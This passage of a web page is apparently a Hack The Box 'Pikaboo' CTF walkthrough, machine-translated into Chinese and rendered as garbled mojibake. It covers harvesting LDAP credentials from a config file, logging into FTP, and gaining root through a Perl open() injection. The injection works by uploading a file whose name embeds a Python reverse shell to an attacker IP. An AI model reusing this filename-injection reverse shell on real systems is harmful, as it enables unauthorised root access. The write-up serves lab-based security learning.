    0.0.0.0:*       <br/>LISTEN    0         128              0.0.0.0:22         0.0.0.0:*       <br/>LISTEN    0         128            127.0.0.1:389        0.0.0.0:*       <br/>LISTEN    0         128                 [::]:80            [::]:*       <br/>LISTEN    0         32                     *:21               *:*       <br/>LISTEN    0         128                 [::]:22            [::]:*</span></pre><p id="c534" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦ä¸€ä¸ªå†…éƒ¨ç³»ç»Ÿï¼Œä¸€å®šæ˜¯ç”¨æ¥åšä»€ä¹ˆçš„ã€‚å†æ¬¡å›å¤´çœ‹çœ‹ï¼Œæˆ‘æ‰¾åˆ°äº†ä¸€äº›pokeapiçš„é…ç½®æ–‡ä»¶:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="878b" class="nc km iq my b gy nd ne l nf ng">www-data@pikaboo:/$ ls -l /opt/pokeapi/config<br/>-rwxr-xr-x 1 root root    0 Jul  6 20:17 __init__.py<br/>drwxr-xr-x 2 root root 4096 Jul  6 16:10 __pycache__<br/>-rw-r--r-- 1 root root  783 Jul  6 20:17 docker-compose.py<br/>-rwxr-xr-x 1 root root  548 Jul  6 20:17 docker.py<br/>-rwxr-xr-x 1 root root  314 Jul  6 20:17 local.py<br/>-rwxr-xr-x 1 root root 3080 Jul  6 20:17 settings.py<br/>-rwxr-xr-x 1 root root  181 Jul  6 20:17 urls.py<br/>-rwxr-xr-x 1 root root 1408 Jul  6 20:17 wsgi.py</span></pre><p id="44c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è®¾ç½®æ–‡ä»¶å¾ˆæœ‰ç”¨:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="eee8" class="nc km iq my b gy nd ne l nf ng">www-data@pikaboo:/$ cat /opt/pokeapi/config/settings.py<br/>&lt;SNIP&gt;<br/>DATABASES = {<br/>    "ldap": {<br/>        "ENGINE": "ldapdb.backends.ldap",<br/>        "NAME": "ldap:///",<br/>        "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",<br/>        "PASSWORD": "&lt;HIDDEN&gt;",<br/>    },<br/>    "default": {<br/>        "ENGINE": "django.db.backends.sqlite3",<br/>        "NAME": "/opt/pokeapi/db.sqlite3",<br/>    }<br/>}</span></pre><p id="89b9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬çœ‹åˆ°ä¸€ä¸ªåŒ…å«å‡­æ®çš„LDAPéƒ¨åˆ†ï¼Œåœ¨æ¡†ä¸­å¯ä»¥çœ‹åˆ°ldapsearchã€‚ä½¿ç”¨<a class="ae nk" href="https://docs.oracle.com/cd/E19693-01/819-0997/auto45/index.html" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>æœ‰ç”¨çš„æ–‡æ¡£ï¼Œæˆ‘æ‰¾åˆ°äº†è¿™ä¸€éƒ¨åˆ†:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="5e37" class="nc km iq my b gy nd ne l nf ng">Returning All Entries<br/>Given the previous information, the following call will return all entries in the directory:<br/><br/>ldapsearch -h myServer -p 5201 -D cn=admin,cn=Administrators,cn=config<br/> -b "dc=example,dc=com" -s sub "(objectclass=*)"<br/>"(objectclass=*)" is a search filter that matches any ent</span></pre><p id="d7c8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘å°†å®ƒä¸æˆ‘ä»¬åˆšåˆšæ‰¾åˆ°çš„credsä¸€èµ·ä½¿ç”¨ï¼Œä»¥è½¬å‚¨æ‰€æœ‰LDAPæ¡ç›®:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nr"><img src="../Images/dc072b7efbd0347f0a3cbb005bc00917.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5l6vQWvWdziZsG1NGpkabg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Ldapsearchè½¬å‚¨æ‰€æœ‰æ¡ç›®</figcaption></figure><p id="e070" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¾“å‡ºå¾ˆé•¿ï¼Œä½†è¿™éƒ¨åˆ†æ­£æ˜¯æˆ‘æƒ³è¦çš„:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="3f46" class="nc km iq my b gy nd ne l nf ng"># pwnmeow, users, ftp.pikaboo.htb<br/>dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb<br/>objectClass: inetOrgPerson<br/>objectClass: posixAccount<br/>objectClass: shadowAccount<br/>uid: pwnmeow<br/>cn: Pwn<br/>sn: Meow<br/>loginShell: /bin/bash<br/>uidNumber: 10000<br/>gidNumber: 10000<br/>homeDirectory: /home/pwnmeow<br/>userPassword:: &lt;HIDDEN&gt;</span></pre><p id="4714" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¯¥å¯†ç æ˜¾ç„¶æ˜¯base64ç¼–ç çš„ï¼Œå› ä¸ºå®ƒåœ¨æœ«å°¾æœ‰ä¸€ä¸ªæŒ‡ç¤ºç¬¦double ==:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="9da1" class="nc km iq my b gy nd ne l nf ng">www-data@pikaboo:/$ echo "&lt;HIDDEN&gt;" | base64 -d<br/>echo "&lt;HIDDEN&gt;" | base64 -d<br/>&lt;HIDDEN&gt;</span></pre><p id="83db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è§£ç ç»™äº†æˆ‘ä»¬ä¸€ä¸ªæ˜æ–‡å¯†ç ã€‚è®©æˆ‘ä»¬å°è¯•ä½¿ç”¨è¿™äº›å‡­æ®è¿›è¡Œftpç™»å½•:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="d1bc" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/pikaboo]<br/>â””â”€# ftp pikaboo.htb<br/>Connected to pikaboo.htb.<br/>220 (vsFTPd 3.0.3)<br/>Name (pikaboo.htb:kali): pwnmeow<br/>331 Please specify the password.<br/>Password:<br/>230 Login successful.<br/>Remote system type is UNIX.<br/>Using binary mode to transfer files.<br/>ftp&gt; pwd<br/>257 "/" is the current directory<br/>ftp&gt; ls<br/>200 PORT command successful. Consider using PASV.<br/>150 Here comes the directory listing.<br/>drwx-wx---    2 ftp  ftp  4096 Nov 13 08:47 abilities<br/>drwx-wx---    2 ftp  ftp   4096 May 20 07:01 ability_changelog<br/>drwx-wx---    2 ftp  ftp  4096 May 20 07:01 ability_changelog_prose<br/>drwx-wx---    2 ftp  ftp  4096 May 20 07:01 ability_flavor_text<br/>drwx-wx---    2 ftp  ftp  4096 May 20 07:01 ability_names</span></pre><p id="62fa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸å‡ºæ‰€æ–™ï¼Œå®ƒæˆåŠŸäº†ï¼Œæˆ‘ä»¬æˆåŠŸäº†ã€‚æ²¡ä»€ä¹ˆå¯çœ‹çš„ï¼Œè¿™è®©æˆ‘å›°æƒ‘äº†å¾ˆé•¿æ—¶é—´ã€‚æœ€åï¼Œæˆ‘å›å¤´çœ‹äº†çœ‹æˆ‘ä»¬æ‰¾åˆ°çš„Perlè„šæœ¬ï¼Œå›´ç»•å®ƒä½¿ç”¨çš„openå‘½ä»¤æœç´¢äº†ä¸€äº›æ¼æ´ï¼Œå¾—åˆ°äº†å¤§é‡ä¿¡æ¯:</p><p id="fae7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae nk" href="https://cheatsheet.haax.fr/linux-systems/programing-languages/perl/" rel="noopener ugc nofollow" target="_blank">https://cheat sheet . haax . fr/Linux-systems/programming-languages/perl</a><a class="ae nk" href="https://stackoverflow.com/questions/26614348/perl-open-injection-prevention" rel="noopener ugc nofollow" target="_blank">https://stack overflow . com/questions/26614348/perl-open-injection-prevention</a><a class="ae nk" href="https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543" rel="noopener ugc nofollow" target="_blank">https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId = 88890543</a><a class="ae nk" href="https://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_2-Command-Injections.pdf" rel="noopener ugc nofollow" target="_blank">https://research . cs . wisc . edu/mist/software security course/Chapters/3 _ 8 _ 2-Command-injections . pdf</a>T8ã€‘https://perl-begin . org/topics/security/code-markup-injection</p><p id="dbec" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç»è¿‡å¤§é‡çš„é˜…è¯»å’Œåå¤è¯•éªŒï¼Œæˆ‘å‘ç°æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶å¹¶é‡å‘½åå®ƒæ¥åˆ©ç”¨csvupdate Perlè„šæœ¬ï¼Œè¿™æ ·å¼€å§‹çš„å­—ç¬¦å°±æ˜¯ä¸€ä¸ªç®¡é“ã€‚ç„¶åæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œå®ƒä¹‹åçš„ä»»ä½•ä»£ç ã€‚</p><p id="36ee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘å°è¯•äº†ä¸€ä¸ªç»å…¸çš„Pentestmonkey <a class="ae nk" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener ugc nofollow" target="_blank"> Pythonåå‘shell </a>æ²¡æœ‰æˆåŠŸã€‚ä¸è¿‡ï¼Œåœ¨å…¶ä»–ç›’å­ä¸Šä½¿ç”¨çš„ä¸€ä¸ªæ›´ç®€å•çš„æ–¹æ³•ç¡®å®æœ‰æ•ˆã€‚</p><p id="533d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸ºäº†åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦æˆ‘ä»¬çš„æ–‡ä»¶åœ¨é€šè¿‡ftpä¸Šä¼ åè¢«å‘½åä¸ºthis:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="fdd8" class="nc km iq my b gy nd ne l nf ng">"|python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.239\",1338));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""\"sh\",""\"-i\"])';.csv"</span></pre><p id="89c7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¯·æ³¨æ„ï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ï¼Œç„¶åæ‰§è¡Œåé¢çš„ä»£ç ã€‚è¿™å°†ä½¿ç”¨Pythonåœ¨Kaliä¸Šä¸ºæˆ‘ä»¬æ‰“å¼€å¤–å£³ã€‚è¿˜å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä¸å¾—ä¸åšäº†ä¸€äº›é¢å¤–çš„åæ–œæ ï¼Œä»¥ç¡®ä¿ç‰¹æ®Šå­—ç¬¦å¾—åˆ°æ­£ç¡®å¤„ç†ã€‚</p><p id="ddf3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å°†å‘½ä»¤æ›´æ”¹ä¸ºKali tun0 IPå’Œç«¯å£åï¼Œæˆ‘ä»¬åªéœ€å°†å®ƒä½œä¸ºputå‘½ä»¤çš„ä¸€éƒ¨åˆ†ç²˜è´´è¿›æ¥ã€‚é¦–æ¬¡ç™»å½•FTP:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="edba" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/pikaboo]<br/>â””â”€# ftp pikaboo.htb<br/>Connected to pikaboo.htb.<br/>220 (vsFTPd 3.0.3)<br/>Name (pikaboo.htb:kali): pwnmeow<br/>331 Please specify the password.<br/>Password:<br/>230 Login successful.<br/>Remote system type is UNIX.<br/>Using binary mode to transfer files.</span></pre><p id="41e6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä»æ ¹æ–‡ä»¶å¤¹è½¬åˆ°å¦ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨é‚£é‡Œæ²¡æœ‰æƒé™:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="99eb" class="nc km iq my b gy nd ne l nf ng">ftp&gt; cd versions<br/>250 Directory successfully changed.</span></pre><p id="b23c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä½¿ç”¨putå‘½ä»¤ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶ä¸Šä¼ åˆ°è¿™é‡Œï¼Œæˆ‘åˆšåˆšåˆ›å»ºäº†ä¸€ä¸ªåä¸ºtestçš„ç©ºç™½æ–‡ä»¶ã€‚ç„¶åï¼Œæˆ‘ä»¬å°†ä¸Šé¢çš„å‘½ä»¤ç²˜è´´åˆ°æœ«å°¾:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="94cd" class="nc km iq my b gy nd ne l nf ng">ftp&gt; put test "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\"10.10.14.239\",1338));[os.dup2(s.fileno(),f)for\ f\ in(0,1,2)];pty.spawn(""\"sh\")';.csv"</span><span id="2933" class="nc km iq my b gy ns ne l nf ng">local: test remote: |python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.239",1338));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")';.csv</span><span id="f85b" class="nc km iq my b gy ns ne l nf ng">200 PORT command successful. Consider using PASV.<br/>150 Ok to send data.<br/>226 Transfer complete.<br/>ftp&gt;</span></pre><p id="a03a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸Šä¼ æ—¶ï¼Œåä¸ºtestçš„æ–‡ä»¶è¢«é‡å‘½åä¸ºæˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½ã€‚ç°åœ¨åˆ‡æ¢åˆ°ä¸€ä¸ªç­‰å¾…ä¸­çš„Netcatç›‘å¬å™¨ï¼Œçœ‹çœ‹æˆ‘ä»¬æœ‰ä¸€ä¸ªåå‘shellä½œä¸ºrootè¿æ¥:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="6746" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/pikaboo]<br/>â””â”€# nc -lvvp 1338<br/>listening on [any] 1338 ...<br/>connect to [10.10.14.239] from pikaboo.htb [10.10.10.249] 52370<br/># id<br/>id<br/>uid=0(root) gid=0(root) groups=0(root)</span></pre><p id="d595" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä½ å¿…é¡»ç­‰å¾…è„šæœ¬è¿è¡Œï¼Œè¿™æ˜¯æ¯åˆ†é’Ÿï¼Œæ‰€ä»¥ä¸ä¼šèŠ±å¾ˆé•¿æ—¶é—´ã€‚ç°åœ¨æˆ‘ä»¬ç»ˆäºå¯ä»¥å¾—åˆ°æ ¹æ ‡å¿—äº†:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="f079" class="nc km iq my b gy nd ne l nf ng"># ls /root<br/>root.txt  vsftpd.log<br/><br/># cat /root/root.txt<br/>&lt;HIDDEN&gt;</span></pre><p id="0fe8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¯¹æˆ‘æ¥è¯´ï¼Œè¿™çœŸçš„æ˜¯ä¸€ä¸ªå¾ˆéš¾çš„ç›’å­ï¼Œä½†ä»ä¸­å¸å–ä¸€äº›æœ‰ç›Šçš„æ•™è®­æ˜¯éå¸¸å€¼å¾—çš„ã€‚</p><p id="befe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å®Œæˆäº†ã€‚ä¸‹æ¬¡è§ã€‚</p></div><div class="ab cl nt nu hu nv" role="separator"><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny"/></div><div class="ij ik il im in"><p id="2533" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦‚æœä½ å–œæ¬¢è¿™ç¯‡æ–‡ç« ï¼Œè¯·ç»™æˆ‘ä¸€ä¸¤ä¸ªæŒå£°ã€‚</p><p id="071d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ¨ç‰¹â€”<a class="ae nk" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>ç½‘ç«™â€” <a class="ae nk" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="5eba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="oa">åŸè½½äº2021å¹´12æœˆ3æ—¥</em><a class="ae nk" href="https://pencer.io/ctf/ctf-htb-pikaboo/" rel="noopener ugc nofollow" target="_blank"><em class="oa">https://pencer . io</em></a><em class="oa">ã€‚</em></p></div></div>    
</body>
</html>